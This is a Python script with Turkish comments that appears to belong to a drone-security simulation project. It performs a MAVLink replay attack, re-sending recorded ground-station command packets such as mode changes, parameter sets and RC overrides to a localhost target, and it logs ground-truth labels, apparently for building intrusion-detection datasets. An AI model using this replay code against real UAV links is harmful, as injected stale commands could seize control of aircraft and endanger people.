#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""replay.py — TEKRAR OYNATMA saldırısı (replay).

Ne yapar: Daha önce kaydedilmiş bir uçuşın paketler.parquet'indeki
raw_hex alanından GERÇEK komut paketlerini okuyup aynen yeniden gönderir.
Böylece geçmişte meşru olan komutlar, bağlamı dışında tekrar enjekte edilir
(klasik replay/tekrar saldırısı).

Önkoşul: Kaynak uçuş raw_hex ile kaydedilmiş olmalı (config: raw_hex_kaydet: true).

GÜVENLİK: Yalnızca 127.0.0.1 hedefine bağlanır. Yalnızca simülasyon içindir.

Kullanım:
    python betikler/saldirilar/replay.py --ucus F208_replay \
        --kaynak-ucus F101_normal --sure 30 --baslangic-gecikme 40
"""

from __future__ import annotations

import time

import saldiri_temel as st
import ortak

try:
    import pandas as pd
except ImportError:
    pd = None

# Tekrar oynatmak için ilginç (komut benzeri) mesaj türleri.
KOMUT_MSGLERI = {"COMMAND_LONG", "COMMAND_INT", "SET_MODE", "MISSION_ITEM",
                 "MISSION_SET_CURRENT", "PARAM_SET", "RC_CHANNELS_OVERRIDE"}


def kaynak_paketleri_oku(kaynak_ucus: str, cfg: dict) -> list[bytes]:
    """Kaynak uçuşın parquet'inden gcs2uav komut paketlerinin raw baytlarını alır."""
    if pd is None:
        ortak.hata_ve_cik("pandas kurulu değil. setup.sh çalıştırın.")
    yol = ortak.ucus_klasoru(kaynak_ucus, cfg) / "paketler.parquet"
    if not yol.exists():
        ortak.hata_ve_cik(f"Kaynak uçuş paketleri bulunamadı: {yol}")
    df = pd.read_parquet(yol)
    if "raw_hex" not in df.columns or df["raw_hex"].fillna("").eq("").all():
        ortak.hata_ve_cik(
            "Kaynak uçuşta raw_hex yok. replay için kaynak uçuş "
            "raw_hex_kaydet:true ile kaydedilmiş olmalı."
        )
    secili = df[(df["direction"] == "gcs2uav") & (df["msgname"].isin(KOMUT_MSGLERI))]
    if secili.empty:
        ortak.log("Komut mesajı bulunamadı; tüm gcs2uav paketleri kullanılacak.", "UYARI")
        secili = df[df["direction"] == "gcs2uav"]
    baytlar = [bytes.fromhex(h) for h in secili["raw_hex"].tolist() if isinstance(h, str) and h]
    ortak.log(f"{len(baytlar)} paket tekrar oynatılmak üzere okundu.", "BILGI")
    return baytlar


def main() -> int:
    ap = st.temel_arg_parser(__doc__)
    ap.add_argument("--kaynak-ucus", required=True, help="Paketlerin okunacağı uçuş.")
    ap.add_argument("--hiz", type=float, default=10.0, help="Saniyede tekrar edilen paket sayısı.")
    args = ap.parse_args()

    cfg = ortak.config_oku()
    baytlar = kaynak_paketleri_oku(args.kaynak_ucus, cfg)
    if not baytlar:
        ortak.hata_ve_cik("Tekrar oynatılacak paket yok.")

    baglanti = st.gonderen_kur(cfg, source_system=255, source_component=190)
    st.baslangic_gecikmesi_bekle(args.baslangic_gecikme)

    ortak.log(f"Tekrar oynatma başlıyor (kaynak: {args.kaynak_ucus}).", "UYARI")
    start_ns = ortak.simdi_ns()
    attacker_addr = None
    aralik = 1.0 / max(args.hiz, 0.1)

    son = time.time() + args.sure
    i = 0
    gonderilen = 0
    while time.time() < son:
        ham = baytlar[i % len(baytlar)]
        try:
            baglanti.write(ham)  # ham baytı doğrudan sokete yaz
        except Exception as e:  # noqa: BLE001
            ortak.log(f"Gönderim hatası: {e}", "UYARI")
        i += 1
        gonderilen += 1
        if attacker_addr is None:
            attacker_addr = st.attacker_addr_al(baglanti, cfg)
        time.sleep(aralik)

    end_ns = ortak.simdi_ns()
    ortak.log(f"Saldırı bitti. {gonderilen} paket tekrar oynatıldı.", "BILGI")

    st.ground_truth_yaz(
        args.ucus, "replay", start_ns, end_ns,
        attacker_addr or f"{cfg.get('host')}:?",
        {"kaynak_ucus": args.kaynak_ucus, "hiz": args.hiz,
         "benzersiz_paket": len(baytlar), "gonderilen": gonderilen}, cfg,
    )
    baglanti.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
